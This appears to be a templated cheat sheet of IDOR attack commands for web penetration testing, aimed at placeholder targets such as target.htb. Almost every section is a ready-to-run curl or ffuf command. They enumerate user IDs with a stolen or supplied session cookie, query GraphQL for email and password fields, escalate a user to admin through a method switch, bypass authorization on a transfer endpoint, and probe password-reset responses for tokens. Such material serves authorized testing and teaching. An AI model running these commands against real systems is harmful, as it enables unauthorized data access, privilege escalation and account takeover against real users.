# IDOR Patterns

> Insecure Direct Object Reference — enumeration, fuzzing, and exploit patterns

<!-- tags: idor, web, authz, enumeration, exploit -->

---

## IDOR - Numeric ID Enumeration
Enumerate sequential resource IDs.

```bash
for i in $(seq 1 1000); do code=$(curl -s -o /dev/null -w "%{http_code}" "{{URL:url:http://target.htb/api/users/}}$i" -b "session={{COOKIE:str:abc123}}"); [ "$code" = "200" ] && echo "ID $i: $code"; done
```

<!-- meta: risk=med | phase=enum | tags=idor,numeric -->

---

## IDOR - Numeric ID Diff
Pull each ID and look for sensitive fields.

```bash
for i in $(seq 1 100); do echo "=== $i ==="; curl -s "{{URL:url:http://target.htb/api/users/}}$i" -b "session={{COOKIE:str:abc123}}"; done
```

<!-- meta: risk=med | phase=exploit | tags=idor,enum -->

---

## IDOR - UUID Enumeration via Wayback
Hunt UUIDs in archived URLs / source.

```bash
curl -s "https://web.archive.org/cdx/search/cdx?url={{DOMAIN:domain:target.htb}}/*&output=text&fl=original" | grep -oE '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}' | sort -u
```

<!-- meta: risk=safe | phase=recon | tags=idor,uuid,wayback -->

---

## IDOR - GraphQL Object Reference
Fetch arbitrary record by ID.

```bash
curl -s -X POST {{URL:url:http://target.htb/graphql}} -H "Content-Type: application/json" -d '{"query":"{ user(id:{{ID:int:1}}) { id email password isAdmin } }"}'
```

<!-- meta: risk=med | phase=exploit | tags=idor,graphql -->

---

## IDOR - Mass Enumerate via Burp Intruder
Use Burp Intruder Sniper / Pitchfork on the ID parameter.

```bash
echo "1. Send request to Intruder. 2. Mark id parameter. 3. Payload: numbers 1-10000. 4. Sort response length."
```

<!-- meta: risk=safe | phase=exploit | tags=idor,burp -->

---

## IDOR - Method Switch Authorization
Sometimes only POST/PUT is auth-checked, GET is not.

```bash
curl -s -X GET "{{URL:url:http://target.htb/api/admin/user/}}1"
curl -s -X PUT "{{URL:url:http://target.htb/api/admin/user/}}1" -d '{"role":"admin"}' -H "Content-Type: application/json"
```

<!-- meta: risk=med | phase=exploit | tags=idor,methodswitch -->

---

## IDOR - Path Traversal in IDs
Try traversal-style values.

```bash
echo "../1\n..%2f1\n%00admin\n0\n-1\n9999999"
```

<!-- meta: risk=med | phase=exploit | tags=idor,traversal -->

---

## IDOR - Add ID Parameter
Try adding parameters not normally sent.

```bash
curl -s "{{URL:url:http://target.htb/api/profile}}?user_id={{ID:int:1}}&id={{ID:int:1}}&uid={{ID:int:1}}&account={{ID:int:1}}"
```

<!-- meta: risk=med | phase=exploit | tags=idor,paramadd -->

---

## IDOR - Array Wrap Bypass
Wrap ID in array — backend may pick first.

```bash
curl -s -X POST {{URL:url:http://target.htb/api/transfer}} -H "Content-Type: application/json" -d '{"id":["{{TARGET_ID:int:2}}","{{MY_ID:int:1}}"]}'
```

<!-- meta: risk=high | phase=exploit | tags=idor,array,bypass -->

---

## IDOR - Wildcard
Some APIs accept * to return all.

```bash
curl -s "{{URL:url:http://target.htb/api/users/*}}"
curl -s "{{URL:url:http://target.htb/api/users?id=*}}"
```

<!-- meta: risk=med | phase=exploit | tags=idor,wildcard -->

---

## IDOR - JSON vs URL-Encoded
Switching content-types may hit different validation.

```bash
curl -s -X POST {{URL:url:http://target.htb/api/transfer}} -H "Content-Type: application/json" -d '{"id":2}'
curl -s -X POST {{URL:url:http://target.htb/api/transfer}} -H "Content-Type: application/x-www-form-urlencoded" -d "id=2"
curl -s -X POST {{URL:url:http://target.htb/api/transfer}} -H "Content-Type: application/xml" -d '<?xml version="1.0"?><req><id>2</id></req>'
```

<!-- meta: risk=med | phase=exploit | tags=idor,contenttype -->

---

## IDOR - Force Browse Admin Endpoints
Discover hidden admin endpoints with auth.

```bash
ffuf -u {{URL:url:http://target.htb/}}FUZZ -w {{WORDLIST:wordlist:/usr/share/seclists/Discovery/Web-Content/admin-panels.txt}} -b "session={{COOKIE:str:abc123}}" -fc 401,403,404
```

<!-- meta: risk=safe | phase=enum | tags=idor,forcebrowse -->

---

## IDOR - User Hash Substitution
Some APIs use hashed/encoded IDs — try common decodings.

```bash
echo "1" | base64
echo "MQ==" | base64 -d
echo -n "1" | md5sum
```

<!-- meta: risk=safe | phase=enum | tags=idor,hash,encoding -->

---

## IDOR - Password Reset Token Hijack
Request reset for victim, see if response includes token.

```bash
curl -s -X POST {{URL:url:http://target.htb/forgot}} -d "email={{EMAIL:str:victim@target.htb}}" -i
```

<!-- meta: risk=high | phase=exploit | tags=idor,reset -->

---

## IDOR - Compare Responses
Diff two requests with same auth but different IDs.

```bash
curl -s "{{URL:url:http://target.htb/api/orders/}}1" -b "s=ABC" > /tmp/r1
curl -s "{{URL:url:http://target.htb/api/orders/}}2" -b "s=ABC" > /tmp/r2
diff /tmp/r1 /tmp/r2
```

<!-- meta: risk=safe | phase=enum | tags=idor,diff -->
